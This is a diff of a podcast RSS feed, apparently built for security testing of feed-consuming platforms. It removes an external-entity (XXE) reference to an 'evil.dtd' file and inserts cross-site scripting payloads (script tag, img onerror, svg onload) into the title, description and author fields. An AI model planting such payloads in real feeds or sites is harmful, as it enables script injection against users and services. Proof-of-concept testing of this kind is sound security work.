@@ -1,26 +1,22 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [
-  <!ENTITY % dtd SYSTEM "https://zombiie404.github.io/Apple-Works-Files/evil.dtd">
-  %dtd;
-]>
 <rss version="2.0" xmlns:itunes="http://www.itunes.apple.com/dtds/podcast-1.0.dtd">
   <channel>
-    <title>Test Podcast</title>
+    <title><script>alert(document.domain)</script></title>
     <link>https://example.com</link>
+    <description><img src=x onerror=alert(document.cookie)></description>
     <language>en</language>
-    <description>A test podcast</description>
-    <itunes:image href="https://via.placeholder.com/3000x3000.jpg"/>
-    <itunes:category text="Technology"/>
-    <itunes:explicit>no</itunes:explicit>
-    <itunes:author>Test</itunes:author>
+    <itunes:author><svg/onload=alert('XSS')></itunes:author>
     <itunes:owner>
       <itunes:name>Test</itunes:name>
       <itunes:email>test@test.com</itunes:email>
     </itunes:owner>
+    <itunes:explicit>no</itunes:explicit>
+    <itunes:image href="https://via.placeholder.com/3000x3000.jpg"/>
+    <itunes:category text="Technology"/>
     <item>
       <title>Episode 1</title>
       <enclosure url="https://example.com/ep1.mp3" type="audio/mpeg" length="10000000"/>
-      <guid>ep1</guid>
+      <guid>ep1-xss-test</guid>
     </item>
   </channel>
 </rss>
